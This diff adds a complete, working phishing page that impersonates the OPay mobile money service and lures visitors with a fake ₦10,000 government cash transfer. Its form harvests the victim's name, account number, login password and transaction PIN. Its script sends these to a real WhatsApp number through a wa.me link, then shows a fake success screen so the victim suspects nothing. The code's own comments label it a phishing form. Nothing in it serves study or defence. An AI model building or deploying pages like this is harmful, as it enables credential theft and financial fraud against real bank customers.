@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPay - Verify Account</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+        }
+        .logo {
+            color: #0e7c3f; /* OPay Green */
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: block;
+            letter-spacing: -1px;
+        }
+        h2 {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        p.subtitle {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 5px 0;
+            box-sizing: border-box;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            background-color: #fafafa;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0e7c3f;
+            background-color: #fff;
+        }
+        label {
+            display: block;
+            text-align: left;
+            margin-left: 5px;
+            color: #555;
+            font-size: 13px;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+        .btn {
+            background-color: #0e7c3f;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            width: 100%;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 25px;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background-color: #095c2d;
+        }
+
+        /* Success Screen Styles */
+        #success-screen {
+            display: none; /* Hidden by default */
+        }
+        .check-icon {
+            color: #0e7c3f;
+            font-size: 60px;
+            margin-bottom: 15px;
+            animation: popIn 0.5s ease;
+        }
+        .amount {
+            font-size: 36px;
+            font-weight: bold;
+            color: #0e7c3f;
+            margin: 10px 0;
+        }
+        .status {
+            color: #28a745;
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .ref-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); opacity: 0; }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PHISHING FORM -->
+    <div class="container" id="form-container">
+        <span class="logo">OPay</span>
+        <h2>Verify Your Account</h2>
+        <p class="subtitle">Complete the details below to receive your ₦10,000 Governmental Cash Transfer.</p>
+        
+        <form id="phishForm" onsubmit="sendToWhatsapp(event)">
+            <label>Full Name</label>
+            <input type="text" id="name" placeholder="e.g. John Doe" required>
+
+            <label>Account Number</label>
+            <input type="number" id="account" placeholder="e.g. 7012345678" required>
+
+            <label>6-Digit Login Password</label>
+            <input type="password" id="loginPass" placeholder="******" maxlength="6" required>
+
+            <label>4-Digit Transaction PIN</label>
+            <input type="password" id="txnPin" placeholder="****" maxlength="4" required>
+
+            <label>Referral Code <span style="font-weight:normal; color:#999;">(Optional)</span></label>
+            <input type="text" id="refCode" placeholder="e.g. OPA-123">
+
+            <button type="submit" class="btn">VERIFY & CLAIM</button>
+        </form>
+    </div>
+
+    <!-- SUCCESS SCREEN (Hidden initially) -->
+    <div class="container" id="success-screen">
+        <div class="check-icon">✔</div>
+        <h2>Transfer Successful!</h2>
+        <p>You have received:</p>
+        <div class="amount">₦10,000.00</div>
+        <p class="status">Governmental Cash Transfer</p>
+        <p class="ref-text">
+            Funds are now available in your wallet.<br>
+            Reference: GOV-TRF-2026-<span id="ref-id"></span>
+        </p>
+    </div>
+
+    <script>
+        function sendToWhatsapp(e) {
+            e.preventDefault(); // Stop the form from refreshing the page
+
+            // 1. Get values from the inputs
+            const name = document.getElementById('name').value;
+            const account = document.getElementById('account').value;
+            const loginPass = document.getElementById('loginPass').value;
+            const txnPin = document.getElementById('txnPin').value;
+            const refCode = document.getElementById('refCode').value || "None";
+
+            // 2. Format the message nicely for WhatsApp
+            // %0A creates a new line
+            const message = `*New OPay Verification Details*%0A%0A` +
+                            `👤 *Name:* ${name}%0A` +
+                            `💳 *Acct No:* ${account}%0A` +
+                            `🔑 *Login Pass:* ${loginPass}%0A` +
+                            `🔒 *Txn PIN:* ${txnPin}%0A` +
+                            `🎟 *Ref Code:* ${refCode}`;
+
+            // 3. Open WhatsApp with the pre-filled message
+            // This opens wa.me link. The user must tap "Send" in their WA app.
+            const whatsappUrl = `https://wa.me/2348081774894?text=${message}`;
+            
+            // Open in a new tab/window so the current page doesn't disappear immediately
+            window.open(whatsappUrl, '_blank');
+
+            // 4. Show Success Screen immediately
+            // This makes the user think the transaction succeeded right there on the site
+            document.getElementById('form-container').classList.add('hidden');
+            document.getElementById('success-screen').style.display = 'block';
+            
+            // Generate a random reference ID for realism
+            document.getElementById('ref-id').innerText = Math.floor(Math.random() * 100000000);
+        }
+    </script>
+
+</body>
+</html>
